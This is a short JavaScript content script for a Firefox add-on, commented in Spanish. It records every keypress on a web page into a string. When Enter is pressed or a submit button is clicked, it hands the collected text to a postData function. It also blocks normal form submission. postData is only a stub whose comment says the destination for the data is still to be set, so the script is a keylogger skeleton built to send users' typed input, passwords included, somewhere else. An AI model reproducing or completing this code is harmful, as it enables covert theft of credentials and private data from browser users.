//funcion que ejecuta los cambios en la pagina
self.port.on("replacePage", function(msg){

  console.log("-------------- FF addon");

  // donde guardar el consolidado de caracteres
  var finalString = '';

  // revisa en todo el documento cuando se presiona una tecla
  $(document).keypress(function (e){  
    // el codigo de la tecla
    var code = e.which;
    // el caracter decoficado
    var character = String.fromCharCode(code);
    console.info("presionaron: "+ code + " == carater " + character);

    // suma el nuevo caracter 
    finalString += character;

    // esta pendiente de la tecla enter
    if (code === 13){
      console.info("Presionado enter");
      console.info('suma de caracteres: ', finalString);
      //llama la funcion que enviara la info
      postData(finalString);
      finalString = '';
    }
  }); 

  // esta pendiente de los botones
  $('input[type=submit]').click(function (e){
    e.preventDefault();

    console.info("Presionado boton");
    console.info('suma de caracteres: ', finalString);
    // llama la funcion que enviara la info
    postData(finalString);
    finalString = '';
  });
});

// Aca tiene que definirse a donde se va la informcion
function postData(data){
  console.info("datos a enviar: ", data);
}

